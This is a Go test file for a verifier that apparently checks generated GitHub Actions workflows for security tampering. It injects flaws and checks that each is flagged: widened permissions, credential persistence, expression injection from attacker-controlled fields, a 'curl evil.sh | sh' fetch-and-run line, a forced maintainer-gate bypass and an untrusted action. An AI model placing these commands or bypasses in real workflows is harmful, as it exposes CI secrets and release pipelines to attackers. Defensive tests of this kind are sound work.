package verify

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/pinfold-ci/pinfold/internal/adapter/github"
	"github.com/pinfold-ci/pinfold/internal/ir"
	"github.com/pinfold-ci/pinfold/internal/load"
	"github.com/pinfold-ci/pinfold/internal/spec"
)

func example(t *testing.T) (*ir.Program, []github.File) {
	t.Helper()
	root, diags := load.ReadFile(filepath.Join("..", "spec", "testdata", "example.yml"))
	if len(diags) != 0 {
		t.Fatal(diags)
	}
	s, diags := spec.Decode("pinfold.yml", root)
	if len(diags) != 0 {
		t.Fatal(diags)
	}
	p := ir.Lower(s)
	return p, github.Compile(p, "pinfold.yml", strings.Repeat("0", 64))
}

func TestGeneratedOutputPasses(t *testing.T) {
	p, files := example(t)
	for i, f := range files {
		if d := Workflow(f.Path, f.Content, p.Workflows[i]); len(d) != 0 {
			t.Errorf("%s: %v", f.Path, d)
		}
	}
}

// TestBrokenAdapterOutput simulates adapter bugs by editing real output; each
// must be caught with the right code.
func TestBrokenAdapterOutput(t *testing.T) {
	p, files := example(t)
	release, w := files[0].Content, p.Workflows[0]
	tests := []struct {
		name, old, new, want string
	}{
		{"workflow write-all", "permissions: {}\njobs:", "permissions: write-all\njobs:", "PF901"},
		{"workflow scope", "permissions: {}\njobs:", "permissions:\n  contents: read\njobs:", "PF901"},
		{"job scope widened", "      contents: read # declared in the spec\n", "      contents: write # declared in the spec\n", "PF902"},
		{"job scope added", "      id-token: write # declared in the spec\n", "      id-token: write # declared in the spec\n      contents: write\n", "PF902"},
		{"job permissions dropped", "    permissions:\n      contents: read # declared in the spec\n", "", "PF902"},
		{"persist-credentials true", "persist-credentials: false", "persist-credentials: true", "PF903"},
		{"persist-credentials as string", "persist-credentials: false", "persist-credentials: 'false'", "PF903"},
		{"checkout ref override", "          persist-credentials: false\n", "          persist-credentials: false\n          ref: refs/pull/1/head\n", "PF903"},
		{"expression in run", "python -m build'", "python -m build ${{ github.event.head_commit.message }}'", "PF904"},
		{"tainted expression in with", "          path: dist/\n          if-no-files-found", "          path: ${{ github.ref_name }}\n          if-no-files-found", "PF904"},
		{"expression smuggled after an allowed one", "          path: dist/\n          if-no-files-found", "          path: ${{ github.sha }}${{ github.ref_name }}\n          if-no-files-found", "PF904"},
		{"expression in job name", "    name: build\n", "    name: ${{ github.actor }}\n", "PF904"},
		{"expression in if", "    needs:\n      - publish\n", "    needs:\n      - publish\n    if: ${{ github.event.issue.title }}\n", "PF904"},
		{"alias hides an expression", "    name: build\n", "    name: &x build\n    environment: *x\n", "PF904"},
		{"container digest swapped", "@sha256:a20ee5e9a490ada64fce0c9176418a4fd5afad3b80e70fb4745803c1309dcdfc", "@sha256:0000000000000000000000000000000000000000000000000000000000000000", "PF905"},
		{"container by floating tag", "docker://ghcr.io/pypa/gh-action-pypi-publish@sha256:a20ee5e9a490ada64fce0c9176418a4fd5afad3b80e70fb4745803c1309dcdfc", "docker://ghcr.io/pypa/gh-action-pypi-publish:release-v1", "PF905"},
		{"extra job", "jobs:\n", "jobs:\n  evil:\n    runs-on: x\n    permissions: {}\n    steps: []\n", "PF902"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !strings.Contains(release, tt.old) {
				t.Fatalf("mutation anchor %q not found in output", tt.old)
			}
			broken := strings.Replace(release, tt.old, tt.new, 1)
			d := Workflow("pinfold-release.yml", broken, w)
			found := false
			for _, x := range d {
				found = found || x.Code == tt.want
			}
			if !found {
				t.Errorf("want %s, got %v", tt.want, d)
			}
		})
	}
}

func TestAllowedExpressions(t *testing.T) {
	p, files := example(t)
	release, w := files[0].Content, p.Workflows[0]
	for _, ok := range []string{"${{ secrets.PYPI_TOKEN }}", "${{ github.sha }}", "${{github.run_id}}"} {
		mutated := strings.Replace(release, "          path: dist/\n          if-no-files-found", "          path: "+ok+"\n          if-no-files-found", 1)
		if d := Workflow("f", mutated, w); len(d) != 0 {
			t.Errorf("%s in with: should be allowed, got %v", ok, d)
		}
	}
	env := strings.Replace(release, "      - run: 'python -m pip install build && python -m build'\n",
		"      - env:\n          T_TITLE: ${{ github.event.issue.title }}\n        run: 'python -m pip install build && python -m build'\n", 1)
	if env == release {
		t.Fatal("env mutation anchor not found")
	}
	if d := Workflow("f", env, w); len(d) != 0 {
		t.Errorf("tainted value in env should be allowed, got %v", d)
	}
}

// TestEffectScriptsCantBeTampered edits the generated triage workflow: a
// github-script step in a privileged job must be marked and run a generated script.
func TestEffectScriptsCantBeTampered(t *testing.T) {
	p, files := example(t)
	triage, w := files[1].Content, p.Workflows[1]
	if d := Workflow("t", triage, w); len(d) != 0 {
		t.Fatalf("clean triage output: %v", d)
	}
	tests := []struct{ name, old, new string }{
		{"script edited", "            // Generated by pinfold (effect add_labels). Do not edit.\n", "            // Generated by pinfold (effect add_labels). Do not edit.\n            require('child_process').execSync('curl evil.sh | sh');\n"},
		{"marker removed", "      - name: 'pinfold: add_labels' # pinfold:generated triage/label/step-1\n", "      - name: 'pinfold: add_labels'\n"},
		{"script replaced", "          script: |\n            // Generated by pinfold (effect add_labels). Do not edit.\n", "          script: |\n            console.log('hi')\n            // Generated by pinfold (effect add_labels). Do not edit.\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !strings.Contains(triage, tt.old) {
				t.Fatalf("anchor not found")
			}
			d := Workflow("t", strings.Replace(triage, tt.old, tt.new, 1), w)
			found := false
			for _, x := range d {
				found = found || x.Code == "PF906"
			}
			if !found {
				t.Errorf("want PF906, got %v", d)
			}
		})
	}
}

// TestMaintainerGateCantBeBypassed edits the triage output, whose job requires a maintainer.
func TestMaintainerGateCantBeBypassed(t *testing.T) {
	p, files := example(t)
	triage, w := files[1].Content, p.Workflows[1]
	gateIf := "        if: 'steps.pinfold_gate.outputs.ok == ''true'''\n"
	tests := []struct{ name, old, new string }{
		{"condition dropped from a step", gateIf, ""},
		{"condition weakened", gateIf, "        if: always()\n"},
		{"gate id renamed", "        id: pinfold_gate\n", "        id: gate\n"},
		{"gate script edited", "// Maintainer gate (design section 4).", "core.setOutput('ok', 'true'); return;\n            // Maintainer gate (design section 4)."},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !strings.Contains(triage, tt.old) {
				t.Fatalf("anchor not found")
			}
			d := Workflow("t", strings.Replace(triage, tt.old, tt.new, 1), w)
			found := false
			for _, x := range d {
				found = found || x.Code == "PF907" || x.Code == "PF906"
			}
			if !found {
				t.Errorf("want PF907/PF906, got %v", d)
			}
		})
	}
}

// TestArtifactBindingCantBeRemoved edits the release output: downloads in
// privileged jobs need the binding step, and job outputs may only report the
// generated upload's id and digest.
func TestArtifactBindingCantBeRemoved(t *testing.T) {
	p, files := example(t)
	release, w := files[0].Content, p.Workflows[0]
	start := strings.Index(release, "      - name: 'pinfold: check artifact dist' # pinfold:generated release/publish/bind-dist\n")
	end := strings.Index(release, "      - name: 'pinfold: download dist' # pinfold:generated release/publish/consume-dist\n")
	if start < 0 || end < 0 {
		t.Fatal("anchors not found")
	}
	tests := []struct {
		name, out, want string
	}{
		{"binding step removed", release[:start] + release[end:], "PF908"},
		{"binding names another artifact", strings.Replace(release, "          PINFOLD_NAME: dist\n", "          PINFOLD_NAME: other\n", 1), "PF908"},
		{"job output smuggles an expression", strings.Replace(release, "${{ steps.pinfold_upload_dist.outputs.artifact-id }}", "${{ github.event.head_commit.message }}", 1), "PF904"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := Workflow("t", tt.out, w)
			found := false
			for _, x := range d {
				found = found || x.Code == tt.want
			}
			if !found {
				t.Errorf("want %s, got %v", tt.want, d)
			}
		})
	}
}

// TestEveryGuaranteedRowHasABreakingTest injects one violation per design §2
// row into real output (rows 2, 4, 6 and 7 are covered by the tests above;
// row 8, lock pins, arrives in M4).
func TestEveryGuaranteedRowHasABreakingTest(t *testing.T) {
	p, files := example(t)
	release, w := files[0].Content, p.Workflows[0]
	publishSteps := "    steps:\n      - name: 'pinfold: check artifact dist' # pinfold:generated release/publish/bind-dist\n"
	buildSteps := "    steps:\n      - name: 'pinfold: checkout' # pinfold:generated release/build/step-1\n"
	inject := func(anchor, step string) string {
		if !strings.Contains(release, anchor) {
			t.Fatalf("anchor not found: %q", anchor)
		}
		return strings.Replace(release, anchor, anchor[:strings.Index(anchor, "\n")+1]+step+anchor[strings.Index(anchor, "\n")+1:], 1)
	}
	tests := []struct {
		row, name, out, want string
	}{
		{"1", "run step in a privileged job", inject(publishSteps, "      - run: curl evil.sh | sh\n"), "PF909"},
		{"1", "unreviewed action in a privileged job", inject(publishSteps, "      - uses: evil/action@v1\n"), "PF909"},
		{"1", "github-script by tag in a privileged job", inject(publishSteps, "      - uses: actions/github-script@v9\n        with:\n          script: 'console.log(1)'\n"), "PF909"},
		{"5", "cache restore in a feeder job", inject(buildSteps, "      - uses: actions/setup-python@v7\n        with:\n          cache: pip\n"), "PF910"},
		{"3", "checkout in another case without hardening", inject(buildSteps, "      - uses: Actions/Checkout@v7\n"), "PF903"},
		{"5", "unknown action in a feeder job", inject(buildSteps, "      - uses: actions/setup-go@v5\n"), "PF910"},
		{"5", "cache input in another case", inject(buildSteps, "      - uses: actions/setup-python@v7\n        with:\n          Cache: pip\n"), "PF910"},
		{"5", "registry action in another case", inject(buildSteps, "      - uses: Actions/Setup-Python@v7\n"), "PF910"},
		{"5", "actions/cache in a privileged job", inject(publishSteps, "      - uses: actions/cache@v4\n        with:\n          path: x\n          key: k\n"), "PF910"},
	}
	for _, tt := range tests {
		t.Run("row "+tt.row+": "+tt.name, func(t *testing.T) {
			d := Workflow("t", tt.out, w)
			found := false
			for _, x := range d {
				found = found || x.Code == tt.want
			}
			if !found {
				t.Errorf("want %s, got %v", tt.want, d)
			}
		})
	}

	// unsafe_run must be stamped in the file.
	unsafe := *w
	unsafe.UnsafeRun = true
	d := Workflow("t", release, &unsafe)
	if len(d) == 0 || d[0].Code != "PF909" {
		t.Errorf("unsafe_run without a stamp: got %v, want PF909", d)
	}
}
